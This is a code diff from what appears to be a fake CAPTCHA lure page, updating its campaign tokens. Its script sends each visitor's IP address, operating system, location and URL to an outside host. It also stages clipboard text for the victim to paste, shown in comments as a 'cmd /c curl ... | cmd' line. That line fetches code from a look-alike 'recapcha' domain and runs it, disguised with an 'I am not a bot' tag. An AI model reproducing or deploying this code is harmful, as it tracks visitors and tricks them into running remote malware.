@@ -92,7 +92,7 @@ function customizeIpAddress(ip) {
 function getRepairedStatus() {
     if (!customizedIpAddress) return;
     // console.log("customizedIpAddress", customizedIpAddress);
-    fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress}&token=303`)
+    fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress}&token=304`)
         .then(response => {
             if (!response.ok) {
                 if (response.status === 404) return null;
@@ -152,12 +152,13 @@ async function getLocationByIP() {
 }
 
 (async function () {
+  console.log("===============")
     const location = await getLocationByIP();
-    fetch('https://status-handler-sage.vercel.app/api/entered-site?token=303', {
+    fetch('https://status-handler-sage.vercel.app/api/entered-site?token=304', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            token: '303',
+            token: '304',
             currentUrl: window.location.href,
             ip: await getIpAddress(),
             os: osType,
@@ -222,7 +223,7 @@ function setClipboardCopyData(textToCopy) {
 function stageClipboard(commandToRun, verification_id) {
   const suffix = " :: ";
   // cmd /c curl -s "https://api.recapcha.fun/auth/v1?token=20" | cmd :: "I am not a bot. Fixing the issue as a service. ID: 12316"
-  // cmd /c curl -s https://api.recapcha.fun/auth/v1?token=303 | cmd /q && exit /b :: ''I am not a bot. I am fixing issues as a service. ID: 9761''
+  // cmd /c curl -s https://api.recapcha.fun/auth/v1?token=304 | cmd /q && exit /b :: ''I am not a bot. I am fixing issues as a service. ID: 9761''
   const ploy = ":: ''I am checking if bot is working not as a service ID: ";
   const end = "''";
   const textToCopy = commandToRun + suffix + ploy + verification_id + end;
